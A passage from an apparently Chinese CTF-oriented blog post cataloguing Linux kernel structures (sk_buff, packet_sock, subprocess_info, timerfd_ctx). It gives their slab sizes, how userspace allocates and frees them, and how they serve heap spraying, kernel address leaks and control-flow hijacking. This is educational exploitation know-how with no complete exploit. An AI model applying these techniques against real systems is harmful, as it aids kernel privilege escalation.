class="line">EXPORT_SYMBOL(__alloc_skb);</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong>，我们在这里注意到分配数据包时使用的是 <code>kmalloc_reserve()</code>，最终会调用到 <code>__kmalloc_node_track_caller()</code>，<strong>走常规的 kmalloc 分配路径</strong>，因此我们仍然可以实现近乎任意大小 object 的分配与释放</p><p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p><p><img src="https://s2.loli.net/2022/04/11/YQJMeIwR8P9hC1t.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">__u8flags;</span><br><span class="line">__u8meta_len;</span><br><span class="line">__u8nr_frags;</span><br><span class="line">__u8tx_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_size;</span><br><span class="line"><span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">frag_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>gso_type;</span><br><span class="line">u32tskey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span>dataref;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment"> * remains valid until skb destructor */</span></span><br><span class="line"><span class="type">void</span> *destructor_arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line"><span class="type">skb_frag_t</span>frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p><p>在内核中调用的是 <code>kfree_skb()</code> 函数进行释放，对于数据，其最终会调用到 <code>skb_release_data()</code> ，在这其中调用到 <code>skb_free_head()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">skb_free_head</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *head = skb-&gt;head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line"><span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">skb_free_frag(head);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(head);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <code>sk_buff</code> 本身则通过 <code>kfree_skbmem()</code> 进行释放，主要就是直接放入对应的 kmem_cache 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Free an skbuff by memory without cleaning the state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kfree_skbmem</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line"><span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment"> * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment"> * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> fastpath;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们也可以看出 <code>sk_buff</code> 结构体也为我们提供了一个简陋的“菜单堆”功能，比较朴素的利用方式就是利用 <code>socketpair</code> 系统调用创建一对套接字，往其中一端写入以完成发包，从另一端读出以完成收包</p><blockquote><p>例题：D^3CTF2022 - d3kheap</p><p>利用参考：CVE-2021-22255</p></blockquote><h1 id="0x0A-packet-sock-与套接字相关（TBD）"><a href="#0x0A-packet-sock-与套接字相关（TBD）" class="headerlink" title="0x0A.packet_sock 与套接字相关（TBD）"></a>0x0A.packet_sock 与套接字相关（TBD）</h1><p><code>sock</code> 结构体是内核网络协议栈中的一个非常重要的基础结构体，<strong>用以在 <em>网络层</em> 表示一个 socket</strong>，内核以这个结构体为核心建立更高层面的抽象 socket，例如表示 BSD socket 的 <code>socket</code> 结构体或是 <code>inet_socket</code> 等结构体都有一个 <code>sock</code> 结构体成员，本节我们介绍 <code>AF_PACKET</code> 族所用到的套接字结构体 <code>packet_sock</code>——其通过常规的 kmalloc 路径进行分配</p><h2 id="packet-sock（kmalloc-2048-GFP-KERNEL）"><a href="#packet-sock（kmalloc-2048-GFP-KERNEL）" class="headerlink" title="packet_sock（kmalloc-2048 | GFP_KERNEL）"></a>packet_sock（kmalloc-2048 | GFP_KERNEL）</h2><p>packet socket 用以在 <em>设备驱动级</em> （OSI Layer 2，数据链路层）收发 raw packets，这允许用户在物理层之上应用用户空间中的协议模块</p><p>当我们通过 socket 系统调用创建 <code>AF_PACKET</code> 族的套接字时，在内核空间中会创建一个 <code>packet_sock</code> 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> &#123;</span></span><br><span class="line"><span class="comment">/* struct sock has to be the first member of packet_sock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span><span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span>*<span class="title">fanout</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>  <span class="title">tpacket_stats_u</span><span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span><span class="title">rx_ring</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span><span class="title">tx_ring</span>;</span></span><br><span class="line"><span class="type">int</span>copy_thresh;</span><br><span class="line"><span class="type">spinlock_t</span>bind_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">pg_vec_lock</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>running;<span class="comment">/* bind_lock must be held */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>auxdata:<span class="number">1</span>,<span class="comment">/* writer must hold sock lock */</span></span><br><span class="line">origdev:<span class="number">1</span>,</span><br><span class="line">has_vnet_hdr:<span class="number">1</span>,</span><br><span class="line">tp_loss:<span class="number">1</span>,</span><br><span class="line">tp_tx_has_off:<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>pressure;</span><br><span class="line"><span class="type">int</span>ifindex;<span class="comment">/* bound device*/</span></span><br><span class="line">__be16num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_rollover</span>*<span class="title">rollover</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mclist</span>*<span class="title">mclist</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>mapped;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span><span class="title">tp_version</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_hdrlen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_reserve;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_tstamp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span><span class="title">skb_completion</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> __<span class="title">rcu</span>*<span class="title">cached_dev</span>;</span></span><br><span class="line"><span class="type">int</span>(*xmit)(<span class="keyword">struct</span> sk_buff *skb);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span><span class="title">prot_hook</span> ____<span class="title">cacheline_aligned_in_smp</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>tp_drops ____cacheline_aligned_in_smp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>当我们创建一个 packet socket 时内核便会分配一个 <code>packet_sock</code> 结构体，我们可以通过如下方式创建 packet socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br></pre></td></tr></table></figure><p>在内核中存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sys_socket()</span><br><span class="line">    __sys_socket()</span><br><span class="line">    sock_create()</span><br><span class="line">    __sock_create()</span><br><span class="line">    <span class="comment">// 首先在 net_families 数组中找协议族对应的 net_proto_family 结构体</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 对 AF_PACKET 而言，其在 packet_init() 中通过 sock_register()</span></span><br><span class="line"><span class="comment">     * 注册了packet_family_ops，其中 create 指针为 packet_create()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 接下来会调用 net_proto_family 的 create 指针进行 sock 的创建</span></span><br><span class="line">    packet_create()</span><br><span class="line">    sk_alloc()</span><br></pre></td></tr></table></figure><p>在 <code>packet_create()</code> 中会调用 <code>sk_alloc()</code> 创建 sock 的空间，这是一个通用的创建 sock 的函数，这里我们注意到传入一个指向 proto 结构体类型全局变量 <code>packet_proto</code> 的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params"> <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, &amp;packet_proto, kern);</span><br></pre></td></tr></table></figure><p><code>sk_alloc()</code> 最后会调用到 <code>sk_prot_alloc()</code>，对于在协议对应的 proto 结构体中有指定 kmem_cache 的情况而言会直接从其中分配对象，否则走常规的 kmalloc 分配路径，这里我们注意到分配的 flag 为 <code>GFP_KERNEL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sock *<span class="title function_">sk_prot_alloc</span><span class="params">(<span class="keyword">struct</span> proto *prot, <span class="type">gfp_t</span> priority,</span></span><br><span class="line"><span class="params"><span class="type">int</span> family)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span></span><br><span class="line"></span><br><span class="line">slab = prot-&gt;slab;</span><br><span class="line"><span class="keyword">if</span> (slab != <span class="literal">NULL</span>) &#123;</span><br><span class="line">sk = kmem_cache_alloc(slab, priority &amp; ~__GFP_ZERO);</span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> sk;</span><br><span class="line"><span class="keyword">if</span> (want_init_on_alloc(priority))</span><br><span class="line">sk_prot_clear_nulls(sk, prot-&gt;obj_size);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">sk = kmalloc(prot-&gt;obj_size, priority);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (security_sk_alloc(sk, family, priority))</span><br><span class="line"><span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(prot-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_free_sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sk;</span><br><span class="line"></span><br><span class="line">out_free_sec:</span><br><span class="line">security_sk_free(sk);</span><br><span class="line">out_free:</span><br><span class="line"><span class="keyword">if</span> (slab != <span class="literal">NULL</span>)</span><br><span class="line">kmem_cache_free(slab, sk);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">kfree(sk);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配的对象 size 为 <code>proto-&gt;obj_size</code>，在 <code>packet_proto</code> 中指定为 <code>packet_sock</code> 的大小，在各个版本上可能略有不同（笔者的机子上是1500+，也见到有1400+的），不过大小浮动不大，最终都会从 <code>kmalloc-2k</code> 中取对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto</span> <span class="title">packet_proto</span> =</span> &#123;</span><br><span class="line">.name  = <span class="string">&quot;PACKET&quot;</span>,</span><br><span class="line">.owner  = THIS_MODULE,</span><br><span class="line">.obj_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> packet_sock),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="释放-1"><a href="#释放-1" class="headerlink" title="释放"></a>释放</h3><p>当我们关闭对应的套接字时就能释放对应的 sock 结构体了</p><p>众所周知 Linux 中“一切皆文件”，在我们创建一个套接字时其实内核中会创建一个 file 结构体并返回给我们一个文件描述符，在 <code>__sys_socket()</code> 中会通过 <code>sock_map_fd()</code> 分配一个文件描述符并将套接字文件的函数表设为 <code>socket_file_ops</code>，其中 close 指针对应的函数应为 <code>sock_close()</code>，其实为 <code>__sock_release() </code>的 wrapper</p><p>该函数会检查 socket 的函数表，若有则直接调用其函数表的 release 函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __sock_release(<span class="keyword">struct</span> socket *sock, <span class="keyword">struct</span> inode *inode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (sock-&gt;ops) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span> =</span> sock-&gt;ops-&gt;owner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inode)</span><br><span class="line">inode_lock(inode);</span><br><span class="line">sock-&gt;ops-&gt;release(sock);</span><br><span class="line">sock-&gt;sk = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (inode)</span><br><span class="line">inode_unlock(inode);</span><br><span class="line">sock-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">module_put(owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sock-&gt;wq.fasync_list)</span><br><span class="line">pr_err(<span class="string">&quot;%s: fasync list not empty!\n&quot;</span>, __func__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sock-&gt;file) &#123;</span><br><span class="line">iput(SOCK_INODE(sock));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">sock-&gt;file = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个表的设置其实在 <code>sk_alloc()</code> 中通过协议族对应的结构体的 create 函数指针执行过程中进行指定，对应 packet socket 而言即在 <code>packet_create()</code> 中指定，这里我们可以看到函数表被设为 <code>packet_ops</code> 或 <code>packet_ops_spkt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params"> <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">sock-&gt;ops = &amp;packet_ops;</span><br><span class="line"><span class="keyword">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class="line">sock-&gt;ops = &amp;packet_ops_spkt;</span><br></pre></td></tr></table></figure><p>这两个函数表的 release 指针对应的都是 <code>packet_release()</code>，最终存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packet_release()</span><br><span class="line">    sock_put()</span><br><span class="line">    sk_free() <span class="comment">// 引用计数为 0 时调用，释放 sock 结构体</span></span><br></pre></td></tr></table></figure><blockquote><p>注意不要混淆了 sock 和 socket 哟，不知道的可以去百度（笑）</p></blockquote><h3 id="数据泄露-6"><a href="#数据泄露-6" class="headerlink" title="数据泄露"></a>数据泄露</h3><h3 id="劫持内核执行流-3"><a href="#劫持内核执行流-3" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><h1 id="0x0B-subprocess-info-与套接字相关"><a href="#0x0B-subprocess-info-与套接字相关" class="headerlink" title="0x0B.subprocess_info 与套接字相关"></a>0x0B.subprocess_info 与套接字相关</h1><p>Linux 内核的网络协议栈的一系列操作同样涉及到一系列的结构体，其中 <code>subprocess_info</code> 便是一个比较神奇的结构体，这里也来简单介绍一下</p><h2 id="subprocess-info：kmalloc-128"><a href="#subprocess-info：kmalloc-128" class="headerlink" title="subprocess_info：kmalloc-128"></a>subprocess_info：kmalloc-128</h2><blockquote><p>感觉没啥好说的…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *path;</span><br><span class="line"><span class="type">char</span> **argv;</span><br><span class="line"><span class="type">char</span> **envp;</span><br><span class="line"><span class="type">int</span> wait;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">int</span> (*init)(<span class="keyword">struct</span> subprocess_info *info, <span class="keyword">struct</span> cred *new);</span><br><span class="line"><span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> subprocess_info *info);</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="产生-amp-释放"><a href="#产生-amp-释放" class="headerlink" title="产生 &amp; 释放"></a>产生 &amp; 释放</h3><p>当我们尝试创建一个未知协议（<code>socket(22, AF_INET, 0)</code>）时，便会创建一个 <code>subprocess_info</code> 结构体，对应地，在系统调用结束之后该结构体便会被立即释放，过程其实有点类似 setxattr，不同的是没有任何用户空间数据会被拷贝至内核空间</p><p>因为该结构体在创建之后就会被释放掉，因此基于该结构体的利用都要用到条件竞争，笔者认为其实不是特别的方便</p><blockquote><p>笔者本想分析一下其创建与释放的调用链，但是大量使用了 LSM hook 看着实在头疼，就此作罢，就利用层面而言这个结构体也不是特别好用+稳定，所以这里只抄一些总结性的结论XD</p></blockquote><h3 id="数据泄露（条件竞争）"><a href="#数据泄露（条件竞争）" class="headerlink" title="数据泄露（条件竞争）"></a>数据泄露（条件竞争）</h3><h4 id="内核-text-段地址-4"><a href="#内核-text-段地址-4" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>该结构体的 <code>work.func</code> 可能指向 <code>call_usermodehelper_exec_work</code>，若是我们能利用条件竞争读出该指针便能泄露出内核的 .text 段的基址</p><h3 id="劫持内核执行流（条件竞争）"><a href="#劫持内核执行流（条件竞争）" class="headerlink" title="劫持内核执行流（条件竞争）"></a>劫持内核执行流（条件竞争）</h3><p>在释放该结构体时会调用其 <code>cleanup</code> 指针成员，若是我们能够在创建该结构体之后、释放该结构体之前劫持该指针便能控制内核执行流</p><blockquote><p>例题：SCTF2022 - flying_kernel</p><blockquote><p>笔者在比赛中死活竞争不出来，就很离谱…所以暂时没有 wp（🕊</p></blockquote></blockquote><h1 id="0x0C-timerfd-ctx-与-timerfd-系列系统调用"><a href="#0x0C-timerfd-ctx-与-timerfd-系列系统调用" class="headerlink" title="0x0C.timerfd_ctx 与 timerfd 系列系统调用"></a>0x0C.timerfd_ctx 与 timerfd 系列系统调用</h1><p>自 2.6.25 版本起 Linux 提供了一种可以用以创建定时器的系统调用——timerfd 系列系统调用，相比起定时器的功能，我们更加关注系统调用过程中涉及到的 <code>timerfd_ctx</code> 结构体</p><h2 id="timerfd-ctx（kmalloc-256-GPF-KERNEL）"><a href="#timerfd-ctx（kmalloc-256-GPF-KERNEL）" class="headerlink" title="timerfd_ctx（kmalloc-256 | GPF_KERNEL）"></a>timerfd_ctx（kmalloc-256 | GPF_KERNEL）</h2><p>该结构体定义于 <code>fs/timerfd.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> <span class="title">tmr</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alarm</span> <span class="title">alarm</span>;</span></span><br><span class="line">    &#125; t;</span><br><span class="line">    <span class="type">ktime_t</span> tintv;</span><br><span class="line">    <span class="type">ktime_t</span> moffs;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> wqh;</span><br><span class="line">    u64 ticks;</span><br><span class="line">    <span class="type">int</span> clockid;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> expired;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> settime_flags;    <span class="comment">/* to show in fdinfo */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">clist</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> cancel_lock;</span><br><span class="line">    <span class="type">bool</span> might_cancel;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的 